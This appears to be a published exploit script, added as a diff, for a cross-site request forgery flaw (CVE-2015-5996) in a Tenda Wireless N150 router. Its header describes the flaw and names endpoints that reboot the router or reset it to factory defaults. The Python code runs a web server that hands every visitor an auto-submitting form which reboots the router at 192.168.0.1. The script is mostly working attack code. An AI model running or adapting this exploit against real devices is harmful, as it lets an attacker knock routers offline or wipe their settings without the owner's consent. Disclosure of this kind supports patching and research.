@@ -1,0 +1,59 @@
+# Exploit Title: Tenda Wireless N150 Router 5.07.50 - Cross-Site Request Forgery (Reboot Router)
+# Date: 2018-07-21
+# Exploit Author: Nathu Nandwani
+# Website: http://nandtech.co
+# CVE: CVE-2015-5996
+#
+# Description:
+#
+# The router is vulnerable to a cross-site request forgery attacker. 
+# If an administrator is currently logged in and visits a 
+# remote webpage containing forms existing in the router's firmware, 
+# a request can be forged to modify existing settings or even 
+# set the router to its default state.
+#
+# These are two examples that can work in the proof of concept: 
+# /goform/SysToolReboot - Reboot the router
+# /goform/SysToolRestoreSet - Set the router to default settings
+#
+# Reference: https://www.kb.cert.org/vuls/id/630872
+
+import socket
+
+server_ip = "0.0.0.0"
+server_port = 80
+
+router_ip = "192.168.0.1"
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind((server_ip, server_port))
+sock.listen(1)
+
+print "Currently listening at " + server_ip + ":" + str(server_port)        
+
+client, (client_host, client_port) = sock.accept()
+
+print "Client connected: " + client_host + ":" + str(client_port)
+print ""
+print client.recv(1000)
+
+client.send('HTTP/1.0 200 OK\r\n')
+client.send('Content-Type: text/html\r\n')
+client.send('\r\n')
+client.send("""
+<html>
+    <body>
+        <form method="post" id="frmSetup" name="frmSetup" action="http://""" + router_ip + """/goform/SysToolReboot">
+            <input name="CMD" value="SYS_CONF" type="hidden">
+            <input name="GO" value="system_reboot.asp" type="hidden">
+            <input name="CCMD" value="0" type="hidden">
+        </form>
+        <script>
+            document.getElementById("frmSetup").submit();
+        </script>
+    </body>
+</html>
+""")
+
+client.close()
+sock.close()
